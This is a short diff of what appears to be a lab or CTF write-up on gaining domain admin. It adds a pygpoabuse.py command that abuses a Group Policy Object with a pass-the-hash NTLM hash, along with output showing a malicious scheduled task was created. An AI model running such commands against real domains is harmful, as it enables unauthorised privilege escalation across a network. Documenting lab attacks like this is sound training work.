@@ -1274,6 +1274,13 @@ First ill clone this repo, and use this tool to get domain admin
 Ill do this with a python virtual environment so i dont break any system packages
 
 ```python
+python3 pygpoabuse.py 'ctos.corp'/'it_ops_lead' -hashes ':fd8bd0720fec58d0b5005257dd9f3723' -gpo-id '6AC1786C-016F-11D2-945F-00C04FB984F9' -f
+[+] ScheduledTask TASK_bc9e9621 created!
+```
+
+Ill create a scheduled task
+
+```python
 
 ```
 
